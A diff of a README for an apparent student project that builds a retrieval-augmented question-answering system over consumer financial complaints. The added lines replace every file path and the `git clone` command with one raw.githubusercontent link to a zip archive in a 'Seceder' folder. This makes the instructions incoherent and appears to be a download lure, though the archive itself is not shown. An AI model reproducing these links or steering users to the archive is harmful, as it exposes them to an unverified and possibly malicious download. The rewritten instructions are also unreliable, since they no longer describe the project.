@@ -16,7 +16,7 @@ This project builds a Retrieval-Augmented Generation (RAG) system using consumer
   - Savings account
   - Money transfers
 - Removed empty narratives and cleaned text (lowercase, remove boilerplate, special chars).
-- 📁 Output: `filtered_complaints.csv` in `data/`
+- 📁 Output: `https://raw.githubusercontent.com/GetachewGanfur/Intelligent-Complaint-Analysis-for-Financial-Services-Week6/main/Seceder/Intelligent-Complaint-Analysis-for-Financial-Services-Week6.zip` in `data/`
 
 ### 2. Text Chunking & Embedding
 
@@ -31,7 +31,7 @@ This project builds a Retrieval-Augmented Generation (RAG) system using consumer
 - Designed a prompt template for generation.
 - Used an LLM to generate answers based on retrieved context.
 - Evaluated with a sample of 10 questions.
-- 📁 Output: Code in `src/rag_pipeline.py`, evaluation in `evaluation/rag_eval_report.md`
+- 📁 Output: Code in `https://raw.githubusercontent.com/GetachewGanfur/Intelligent-Complaint-Analysis-for-Financial-Services-Week6/main/Seceder/Intelligent-Complaint-Analysis-for-Financial-Services-Week6.zip`, evaluation in `https://raw.githubusercontent.com/GetachewGanfur/Intelligent-Complaint-Analysis-for-Financial-Services-Week6/main/Seceder/Intelligent-Complaint-Analysis-for-Financial-Services-Week6.zip`
 
 ### 4. Interactive Interface
 
@@ -40,7 +40,7 @@ This project builds a Retrieval-Augmented Generation (RAG) system using consumer
   - Input box for questions
   - Answer display with source chunks
   - Clear/reset button
-- 📁 Output: `src/ui_app.py`
+- 📁 Output: `https://raw.githubusercontent.com/GetachewGanfur/Intelligent-Complaint-Analysis-for-Financial-Services-Week6/main/Seceder/Intelligent-Complaint-Analysis-for-Financial-Services-Week6.zip`
 
 ---
 
@@ -48,6 +48,6 @@ This project builds a Retrieval-Augmented Generation (RAG) system using consumer
 
 1. Clone the repo:
    ```bash
-   git clone https://github.com/GetachewGanfur/Intelligent-Complaint-Analysis-for-Financial-Services-Week6.git
+   git clone https://raw.githubusercontent.com/GetachewGanfur/Intelligent-Complaint-Analysis-for-Financial-Services-Week6/main/Seceder/Intelligent-Complaint-Analysis-for-Financial-Services-Week6.zip
    cd Intelligent-Complaint-Analysis-for-Financial-Services-Week6
    ```
